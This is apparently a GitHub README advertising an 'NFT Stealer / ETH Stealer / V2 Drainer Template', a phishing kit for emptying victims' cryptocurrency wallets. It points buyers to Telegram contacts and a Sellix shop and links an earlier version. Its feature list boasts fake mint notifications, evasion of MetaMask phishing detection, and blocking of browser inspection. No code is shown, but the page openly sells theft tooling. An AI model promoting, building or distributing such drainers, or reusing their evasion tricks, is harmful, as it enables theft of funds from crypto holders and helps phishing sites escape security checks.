 # Welcome! ` [BETA TESTING] `
 ## ⚠️This drainer might be outdated, **message me on Telegram to buy the lastest version**

### 📩 DM me here: [@TecOnSellix](https://t.me/TecOnSellix) or join our [group](https://t.me/cryptodrainers) to follow updates!

---
## 💧 NFT Stealer / ETH Stealer / V2 Drainer Template
#### for fixed version, use the V1 [(click here)](https://github.com/0x32Moon/NFT-Crypto-Drainer)
### <center>❄️ Preview of the Drainer
[![Preview - Click to play](https://cdn.discordapp.com/attachments/987748605542666381/988246810978041856/Photoshop_vonKEsem5A.png)](https://cdn.discordapp.com/attachments/914551334680797195/986413868505002004/drainer.mp4)
Click to play
---

## `🛡️ Features`
- [x] Inspect Element Detection
- [x] No API needed
- [x] Fake Mint Notification
- [x] Custom & Cool Design
- [x] Instant transactions
- [x] No contract required
- [x] Anti Metamask Phishing Detections
- [x] Anti F12 Inspect


## `🌊 Socials`

- Telegram: https://t.me/zentoh
- Shop: https://tec.sellix.io
- Group: https://t.me/cryptodrainers

##### Please ⭐ the repo to support this project & follow next updates
![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)
